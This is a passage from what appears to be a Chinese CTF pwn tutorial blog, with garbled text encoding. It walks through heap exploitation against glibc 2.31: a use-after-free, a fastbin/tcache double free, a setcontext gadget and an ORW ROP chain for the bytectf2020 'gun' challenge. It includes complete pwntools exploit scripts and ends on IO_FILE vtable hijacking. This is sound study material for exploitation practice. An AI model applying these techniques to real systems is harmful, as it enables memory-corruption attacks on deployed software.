libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>)).__next__()<br>    pop_rsi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>)).__next__()<br>    pop_rdx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>)).__next__()<br><br>    <span class="hljs-comment"># double free in tcache 2</span><br>    delete(<span class="hljs-number">2</span>)<br>    delete(<span class="hljs-number">2</span>)<br><br>    <span class="hljs-comment"># overwrite node[0]</span><br>    new(<span class="hljs-number">0x60</span>, p64(note_addr)) <span class="hljs-comment"># idx 4, former 2</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 5, former 2</span><br>    new(<span class="hljs-number">0x60</span>, p64(environ))<span class="hljs-comment"># idx 6, locate at the note[0] and overwrite it</span><br><br>    <span class="hljs-comment"># leak stack addr</span><br>    dump(<span class="hljs-number">0</span>)<br>    stack_leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    ret = stack_leak - <span class="hljs-number">0x220</span><br><br>    <span class="hljs-comment"># rop chain</span><br>    payload = p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="hljs-number">4</span>) + p64(e.plt[<span class="hljs-string">&#x27;read&#x27;</span>]) <span class="hljs-comment"># read str &#x27;flag&#x27; from input</span><br>    payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="hljs-number">4</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>])<span class="hljs-comment"># open file &#x27;flag&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="hljs-number">0x30</span>) + p64(e.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<span class="hljs-comment"># read flag from file ptr 3(opened by open())</span><br>    payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><br>    <span class="hljs-comment"># double free write rop chain on stack</span><br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    new(<span class="hljs-number">0xb0</span>, p64(ret))<span class="hljs-comment"># idx 7, former 3</span><br>    new(<span class="hljs-number">0xb0</span>, <span class="hljs-string">&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 8, former 3</span><br>    new(<span class="hljs-number">0xb0</span>, payload) <span class="hljs-comment"># idx 9, locate on the stack</span><br><br>    <span class="hljs-comment"># get the flag</span><br>    p.send(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¾—flag</p>
<p><img src="https://i.loli.net/2020/11/20/FcWrg87oXnbLCMz.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h3><p>setcontextå‡½æ•°æ˜¯libcä¸­ä¸€ä¸ªç‹¬ç‰¹çš„å‡½æ•°ï¼Œå…¶ä¸­å­˜åœ¨ç€ä¸€ä¸ªå¯ä»¥è®©æˆ‘ä»¬æ§åˆ¶å„å¯„å­˜å™¨çš„gadgetï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆæ¥è‡ª<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-263640.htm">ScUpax0s -  å­—èŠ‚è·³åŠ¨ByteCTF2020 ä¸¤é“å †é¢˜ </a>ï¼‰</p>
<p><img src="https://s3.ax1x.com/2020/11/20/DQ7UyV.png" srcset="/img/loading.gif" lazyload alt="DQ7UyV.png"></p>
<p>åªè¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ rdi å¯„å­˜å™¨ï¼Œåœ¨ç‰¹å®šçš„ä½ç½®æ„é€ ä¸€ä¸ª  <code>ucontext_t</code>ç»“æ„ä½“ ï¼Œæ‰§è¡Œsetcontext + 61ä½ç½®ä¸Šçš„gadgetï¼Œå°±èƒ½é€šè¿‡ç±»ä¼¼ SROP çš„è¿‡ç¨‹æ§åˆ¶è¿›ç¨‹å„å¯„å­˜å™¨çš„å€¼ï¼Œéšåå°±æ˜¯æ ˆè¿ç§» + ROPä¸€å¥—å¸¦èµ°</p>
<p>é€šå¸¸æƒ…å†µä¸‹é€‰æ‹©åœ¨å †ä¸Šæ„é€  <code>ucontext_t</code>ç»“æ„ä½“ï¼ŒåŠ«æŒ__free_hookä¸ºä»¥ä¸‹gadgetï¼š</p>
<p><img src="https://i.loli.net/2021/02/10/fFBGcstHr6X9JuN.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è¿™ä¸ª gadget ä¸€èˆ¬åœ¨è¿™ä¸ªå‡½æ•°é‡Œ</p>
<p><img src="https://i.loli.net/2021/05/06/YAkOqJIzrUnFLN9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h4 id="ä¾‹é¢˜ï¼šbytectf2020-gun-Use-After-Free-fastbin-double-free-ORW"><a href="#ä¾‹é¢˜ï¼šbytectf2020-gun-Use-After-Free-fastbin-double-free-ORW" class="headerlink" title="ä¾‹é¢˜ï¼šbytectf2020 - gun - Use After Free + fastbin double free + ORW"></a>ä¾‹é¢˜ï¼šbytectf2020 - gun - Use After Free + fastbin double free + ORW</h4><p><a href="/download/bytectf2020/pwn/gun/gun" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-gun</a></p>
<p><a href="/download/bytectf2020/pwn/gun/libc-2.31.so" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-libc-2.31.so</a></p>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å¼€ï¼ˆ<del>å¤§æ¯”èµ›çš„å †é¢˜å¥½åƒéƒ½æ˜¯ä¿æŠ¤å…¨å¼€ï¼Œå·²ç»æ²¡æœ‰checksecçš„å¿…è¦äº†</del>ï¼‰</p>
<p><img src="https://i.loli.net/2020/12/08/Kaw5yg3udnEVMBp.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ<del>ï¼ŒIDAåˆ†æå‡ºä¸€å¨shit</del></p>
<p>ç¬¦å·è¡¨æ‰£å…‰ï¼Œå•¥éƒ½çœ‹ä¸å‡ºï¼ˆæ‚²ï¼‰</p>
<p><img src="https://i.loli.net/2020/12/08/H5EqnWwVeCjIKh6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>seccompé™åˆ¶äº†ä¸€å †ä¸œè¥¿ï¼Œç¢ç£¨ç€åº”è¯¥æ˜¯æ‹¿ä¸åˆ°shelläº†ï¼Œåº”è¯¥è¿˜æ˜¯åªèƒ½èµ°orwæ‹¿å¼—è±æ ¼</p>
<p><img src="https://i.loli.net/2020/12/08/EmitBpFlnNKP7X9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç¨‹åºæ¨¡æ‹Ÿäº†ä¸€æŠŠæªï¼Œèƒ½å¤Ÿå°„å‡ºã€è£…è½½ã€è´­ä¹°å­å¼¹ï¼Œå…¶ä¸­å­å¼¹å¯¹åº”çš„å°±æ˜¯chunkï¼Œè´­ä¹°å­å¼¹å¯¹åº”malloc</p>
<p><img src="https://i.loli.net/2021/02/05/wxq2SRUBbMs5mcl.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æœ€å¤šèƒ½å¤Ÿåˆ†é…14ä¸ªå †å—ï¼Œç©ºé—´å……è¶³ï¼ˆx</p>
<p><img src="https://i.loli.net/2021/02/05/94rFSObq7T3h6zI.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨<code>buy()</code>å‡½æ•°ä¸­é™åˆ¶äº†chunkçš„sizeä¸º0x10~0x500ï¼ˆä¼¼ä¹æ²¡ä»€ä¹ˆç”¨ï¼‰</p>
<p><img src="https://i.loli.net/2021/02/06/eqmvJSHc7I3YDin.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å…¶ä¸­<code>qword_4070</code>å­˜æ”¾çš„æ˜¯å­å¼¹æ§½å¯¹åº”æ ‡å¿—ä½ï¼Œ0ä¸ºè¯¥æ§½å­å¼¹å·²è¢«å°„å‡ºï¼ˆfreeï¼‰ï¼Œ1ä¸ºè¯¥æ§½å·²è¢«ä½¿ç”¨ï¼ˆå­˜æ”¾æœ‰chunkæŒ‡é’ˆï¼‰ï¼Œ2ä¸ºè¯¥æ§½å­å¼¹å·²è¢«è£…è½½ï¼ˆé“¾å…¥â€å¼¹åŒ£â€œå•å‘é“¾è¡¨ä¸­ï¼‰</p>
<p>ç»¼åˆèµ·æ¥æˆ‘ä»¬ä¸éš¾çœ‹å‡ºå…¶ä½¿ç”¨ä¸€ä¸ªç»“æ„ä½“æ¥è¡¨ç¤ºä¸€ä¸ªâ€œå­å¼¹â€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">INTERNAL_BULLET_</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * name;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> flag;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">INTERNAL_BULLET_</span> * <span class="hljs-title">next_bullet</span>;</span><br>&#125;bullet;<br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>æˆå‘˜name</code>å‚¨å­˜çš„ä¾¿æ˜¯chunkæŒ‡é’ˆ</p>
<p>åœ¨<code>load()</code>å‡½æ•°ä¸­ä¼šä½¿ç”¨å¤´æ’æ³•æ„å»ºâ€å¼¹åŒ£â€œï¼ˆå•å‘é“¾è¡¨ï¼‰ï¼Œå…¶ä¸­ä¼šä½¿ç”¨chunkçš„bkæŒ‡é’ˆå­˜å‚¨åŸé“¾è¡¨ä¸­å¤´ç»“ç‚¹</p>
<p><img src="https://i.loli.net/2021/02/05/MbjAFZzscO56dhE.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨<code>shoot()</code>å‡½æ•°ä¸­ä¼šä¾æ¬¡å°†â€å¼¹åŒ£â€œé“¾è¡¨ä¸Šçš„â€å­å¼¹â€é‡Šæ”¾ï¼Œéšåä¼šå°†è¯¥å­å¼¹çš„flagç½®0ï¼Œ<strong>ä½†æ˜¯æ²¡æœ‰æ¸…ç©ºå…¶next_chunkæŒ‡é’ˆï¼Œå­˜åœ¨ Use After Free æ¼æ´ï¼Œå¯¹äºå­å¼¹é“¾è¡¨çš„ä¸ä¸¥æ ¼æ£€æµ‹å¯ä»¥å¯¼è‡´double free</strong></p>
<p>åŒæ—¶shootå‡½æ•°è¿˜æ•´åˆäº†æ‰“å°å †å—å†…å®¹çš„åŠŸèƒ½ï¼Œåˆ©ç”¨è¿™ä¸ªåŠŸèƒ½æˆ‘ä»¬å¯ä»¥é€šè¿‡å†åˆ†é…åäºŒæ¬¡é‡Šæ”¾çš„æ–¹å¼é€šè¿‡chunkä¸Šæ®‹ç•™æŒ‡é’ˆæ³„éœ² libc åŸºå€ä¸å †åŸºå€</p>
<p><img src="https://i.loli.net/2021/02/06/7FxncCbzOGshmBe.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç”±äºé¢˜ç›®æ‰€ç»™çš„ libc ç‰ˆæœ¬ä¸º 2.31ï¼Œæ·»åŠ äº†å¯¹ tcache key çš„æ£€æµ‹ï¼Œæ— æ³•ç›´æ¥åœ¨ tcache å†…è¿›è¡Œ double freeï¼Œæ•…è€ƒè™‘<strong>å…ˆå¡«æ»¡ tcache ååœ¨ fastbin å†… double freeï¼Œåé€šè¿‡ stash æœºåˆ¶æ¸…ç©º tcache ä½¿å¾— fastbin å†…å½¢å¦‚ A-&gt;B-&gt;A çš„ chunk å€’å…¥ tcache ä¸­ï¼Œå®ç°ä»»æ„åœ°å€å†™</strong>ï¼Œè¿™ç§åšæ³•<strong>ä¸éœ€è¦é€šè¿‡ fastbin çš„ size æ£€æŸ¥</strong></p>
<p>åŒæ—¶ç”±äºç¨‹åºæœ¬èº«é™åˆ¶äº†ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡orwè¯»å–flag</p>
<p>è€ƒè™‘é€šè¿‡<code>setcontext()</code>ä¸­çš„gadgetè¿›è¡Œæ§åˆ¶å¯„å­˜å™¨ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜éœ€è¦æ§åˆ¶rdxå¯„å­˜å™¨ï¼Œè€ƒè™‘åŠ«æŒ__free_hookåé€šè¿‡libcä¸­å¦‚ä¸‹gadgetæ§åˆ¶rdxåè·³è½¬è‡³setcontextå‡½æ•°å†…éƒ¨ï¼š</p>
<p><img src="https://i.loli.net/2021/02/10/fFBGcstHr6X9JuN.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æœ€åé€šè¿‡setcontextæ„å»ºçš„ropé“¾orwå³å¯ï¼Œä½¿ç”¨pwntoolsä¸­çš„<code>SigreturnFrame()</code>å¯ä»¥å¿«é€Ÿæ„é€  <code>ucontext_t</code>ç»“æ„ä½“ </p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./gun&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./gun&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">command:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Action&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(command).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shoot</span>(<span class="hljs-params">times:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Shoot time: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(times).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Which one do you want to load?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Bullet price: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Bullet Name: &quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p.sendline(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    buy(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 0</span><br>    buy(<span class="hljs-number">0x500</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 1</span><br>    buy(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 2</span><br><br>    <span class="hljs-comment"># leak the libc addr</span><br>    load(<span class="hljs-number">1</span>)<br>    shoot(<span class="hljs-number">1</span>)<br>    buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;&#x27;</span>) <span class="hljs-comment"># idx 1</span><br>    load(<span class="hljs-number">1</span>)<br>    shoot(<span class="hljs-number">1</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">1168</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment"># leak the heap addr</span><br>    buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;AAAAAAAAAAAAAAAA&#x27;</span>) <span class="hljs-comment"># idx 1</span><br>    load(<span class="hljs-number">1</span>)<br>    shoot(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;AAAAAAAAAAAAAAAA&#x27;</span>)<br>    heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    log.info(<span class="hljs-string">&#x27;heap addr leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_leak))<br>    heap_base = heap_leak &amp; <span class="hljs-number">0xfffffffff000</span><br>    log.success(<span class="hljs-string">&#x27;heap base: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>    <span class="hljs-comment"># construct the fake_frame on heap</span><br>    fake_frame_addr = heap_base + <span class="hljs-number">0x310</span> + <span class="hljs-number">0x10</span><br>    fake_frame = SigreturnFrame()<br>    fake_frame[<span class="hljs-string">&#x27;uc_stack.ss_size&#x27;</span>] = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br>    fake_frame.rdi = <span class="hljs-number">0</span><br>    fake_frame.rsi = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    fake_frame.rdx = <span class="hljs-number">0x200</span><br>    fake_frame.rsp = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    fake_frame.rip = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>    load(<span class="hljs-number">0</span>)<br>    shoot(<span class="hljs-number">1</span>)<br>    buy(<span class="hljs-number">0x100</span>, <span class="hljs-built_in">bytes</span>(fake_frame))<br><br>    <span class="hljs-comment"># tcache poisoning with fastbin double free</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    load(<span class="hljs-number">9</span>)<br>    load(<span class="hljs-number">10</span>)<br>    shoot(<span class="hljs-number">2</span>)<br>    buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 9</span><br>    buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 10</span><br>    load(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>        load(<span class="hljs-number">3</span> + i)<br>    shoot(<span class="hljs-number">7</span>)<br>    load(<span class="hljs-number">10</span>)<br>    load(<span class="hljs-number">9</span>)<br>    shoot(<span class="hljs-number">3</span>) <span class="hljs-comment"># double free in fastbin</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># clear the tcache</span><br>    buy(<span class="hljs-number">0x20</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])) <span class="hljs-comment"># idx 9</span><br>    buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;./flag\x00&#x27;</span>) <span class="hljs-comment"># idx 10, which we use to store the flag</span><br>    buy(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># idx 11, overlapping chunk with idx 9</span><br>    buy(<span class="hljs-number">0x20</span>, p64(libc_base + <span class="hljs-number">0x154930</span>)) <span class="hljs-comment"># idx12, our fake chunk on __free_hook</span><br><br>    <span class="hljs-comment"># construct the setcontext with gadget chain</span><br>    flag_addr = heap_base + <span class="hljs-number">0x570</span> + <span class="hljs-number">0x10</span><br><br>    payload = p64(<span class="hljs-number">0</span>) + p64(fake_frame_addr)<span class="hljs-comment"># rdi + 8 for the rdx, we set it to the addr of the fake frame</span><br><br>    buy(<span class="hljs-number">0x100</span>, payload) <span class="hljs-comment"># idx 13</span><br><br>    <span class="hljs-comment"># construct the orw rop chain</span><br>    pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()<br>    pop_rsi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rsi ; ret&#x27;</span>)).__next__()<br>    pop_rdx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdx ; ret&#x27;</span>)).__next__()<br>    pop_rdx_pop_rbx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdx ; pop rbx ; ret&#x27;</span>)).__next__()<br><br>    orw = <span class="hljs-string">b&#x27;&#x27;</span><br>    orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="hljs-number">4</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>])<br>    orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>])<br>    orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>])<br><br>    <span class="hljs-comment"># get the flag</span><br>    load(<span class="hljs-number">13</span>)<br>    shoot(<span class="hljs-number">1</span>)<br>    p.sendline(orw)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾—flag</p>
<p><img src="https://i.loli.net/2021/02/10/CNypQMasthTbzK9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>æœ‰å…³setcontext()çš„åˆ©ç”¨è§ï¼š<a target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/993">setcontext å‡½æ•°exploit - Exä¸ªäººåšå®¢</a></p>
</blockquote>
<blockquote>
<p>ä»¥åŠæ„é€ ropé“¾æ—¶é‡åˆ°äº†ä¸€ä¸ªç„å­¦é—®é¢˜â€¦ä½¿ç”¨libcä¸­çš„<code>pop rdx ; ret</code>çš„gadgetä¼šè§¦å‘Segmentation Faultï¼Œåªå¥½æ”¹ç”¨<code>pop rdx ; pop rbx ; ret</code>çš„gadgetæ¥æ›´æ”¹rdxå¯„å­˜å™¨çš„å€¼â€¦åŸå› ä¸æ˜â€¦</p>
</blockquote>
<h2 id="ä¹ã€IO-FILE-exploit"><a href="#ä¹ã€IO-FILE-exploit" class="headerlink" title="ä¹ã€IO_FILE exploit"></a>ä¹ã€IO_FILE exploit</h2><p>å¯¹äºFILEç»“æ„ä½“çš„åˆ©ç”¨ä¹Ÿæ˜¯CTFä¸­çš„å¤§çƒ­é—¨ä¹‹ä¸€ï¼Œé€šè¿‡ä¿®æ”¹FILEç»“æ„ä½“æˆ–æ˜¯åŠ«æŒvtableè¡¨ç­‰æ–¹å¼å¯ä»¥ä»¤æ”»å‡»è€…ååˆ†æ–¹ä¾¿åœ°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</p>
<p>å¯¹äºFILEç»“æ„ä½“çš„ç›¸å…³å®šä¹‰è§<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/io_file/introduction/">CTF WIKI</a></p>
<h3 id="vtable-hijack"><a href="#vtable-hijack" class="headerlink" title="vtable hijack"></a>vtable hijack</h3><p>å¯¹äºæ¯ä¸€ä¸ªFILEç»“æ„ä½“ï¼Œå…¶éƒ½æœ‰ä¸€ä¸ªè™šå‡½æ•°è¡¨ï¼Œåœ¨é€šè¿‡FILEç»“æ„ä½“å®ç°å„ç§è¾“å…¥è¾“å‡ºåŠŸèƒ½æ—¶å¾€å¾€ä¼šè°ƒç”¨å…¶ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶è¯¥è™šå‡½æ•°è¡¨ï¼Œå°±èƒ½é€šè¿‡FILEç»“æ„ä½“ç›¸å…³çš„å‡½æ•°è°ƒç”¨æµç¨‹æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</p>
